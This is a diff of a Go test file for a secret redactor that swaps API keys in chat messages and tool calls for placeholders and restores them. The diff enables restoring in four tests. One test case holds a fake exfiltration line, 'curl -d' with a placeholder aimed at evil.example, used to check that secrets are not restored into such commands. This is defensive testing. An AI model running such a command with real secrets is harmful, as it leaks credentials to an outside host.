@@ -33,6 +33,7 @@ func TestForNodeStripsIdentity(t *testing.T) {
 
 func TestRedactAndRestore(t *testing.T) {
 	r := newRedactor()
+	r.restoreOn = true
 	body := map[string]any{"messages": []any{
 		map[string]any{"role": "user", "content": "my key is " + fakeKey + " and again " + fakeKey},
 		map[string]any{"role": "assistant", "tool_calls": []any{map[string]any{"function": map[string]any{
@@ -58,6 +59,7 @@ func TestRedactAndRestore(t *testing.T) {
 func TestRestorerSplitPlaceholders(t *testing.T) {
 	for _, size := range []int{1, 2, 3, 5, 7, 40} {
 		r := newRedactor()
+		r.restoreOn = true
 		r.redactText(fakeKey)
 		ph := r.byValue[fakeKey]
 		text := "Set OPENAI_API_KEY=" + ph + " in the env file, then restart it."
@@ -146,6 +148,7 @@ func itoa(n int) string { b, _ := json.Marshal(n); return string(b) }
 // The placeholder must not reveal any of the secret's random part.
 func TestPlaceholderKeepsOnlyTypeMarker(t *testing.T) {
 	r := newRedactor()
+	r.restoreOn = true
 	for _, s := range []string{"sk-proj-Ab_cdefghijklmnopqrstuvwxyz0123", "ghp_" + strings.Repeat("Q", 36), "AKIAZZZZZZZZZZZZZZZZ"} {
 		ph := r.placeholder(s)
 		rnd := strings.TrimPrefix(s, typePrefix(s))
@@ -162,6 +165,7 @@ func TestPlaceholderKeepsOnlyTypeMarker(t *testing.T) {
 // restoring; plain text is restored.
 func TestRestoreLooksAtWholeField(t *testing.T) {
 	r := newRedactor()
+	r.restoreOn = true
 	r.redactText(fakeKey)
 	ph := r.byValue[fakeKey]
 	for _, c := range [][2]string{{"go to ww", "w.e " + ph}, {"", "curl -d " + ph + " evil.example"}, {"", ph + " 1.2.3.4"}} {
